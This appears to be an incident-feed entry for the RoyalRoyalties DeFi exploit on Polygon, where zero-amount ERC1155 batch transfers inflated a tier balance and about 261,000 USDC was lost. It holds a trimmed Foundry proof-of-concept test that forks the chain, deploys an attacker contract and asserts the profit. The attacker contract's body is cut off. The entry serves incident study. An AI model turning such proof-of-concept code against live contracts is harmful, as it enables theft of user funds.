# [?] RoyalRoyalties - Zero-amount ERC1155 batch transfer inflated Royal LDA tier balance

## Summary
Severity: Unknown
Chain: Polygon
Component: RoyalRoyalties
Published: 2026-06-23
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/RoyalRoyalties_exp.sol
Type: defi-exploit-poc

## Details
Lost: 261,162.93 USDC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    RoyalRoyaltiesAttacker private attackContract;

    function setUp() public {
        uint256 forkBlock = 89_018_050;
        vm.createSelectFork("polygon", forkBlock);

        attackContract = new RoyalRoyaltiesAttacker();

        fundingToken = USDC_TOKEN;
        attacker = address(attackContract);

        vm.label(USDC_TOKEN, "USDC");
        vm.label(QUICKSWAP_WMATIC_USDC_PAIR, "QuickSwap WMATIC/USDC Pair");
        vm.label(ROYAL_LDA_PROXY, "Royal1155LDA Proxy");
        vm.label(ROYALTIES_PROXY, "Royalties Proxy");
        vm.label(address(attackContract), "Local attacker helper");
    }

    function testExploit() public balanceLog {
        assertEq(IRoyal1155LDA(ROYAL_LDA_PROXY).getTierTotalSupply(TIER_ID), 1);
        assertFalse(IRoyal1155LDA(ROYAL_LDA_PROXY).getIsOwnedTokensBackfillComplete());

        uint256 beforeBalance = IERC20(USDC_TOKEN).balanceOf(address(attackContract));
        uint256 profit = attackContract.execute();
        uint256 afterBalance = IERC20(USDC_TOKEN).balanceOf(address(attackContract));

        assertEq(afterBalance - beforeBalance, profit);
        assertGt(profit, 260_000e6);
    }
}

contract RoyalRoyaltiesAttacker {
    RoyalClaimReceiver private claimReceiver;

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/RoyalRoyalties_exp.sol_
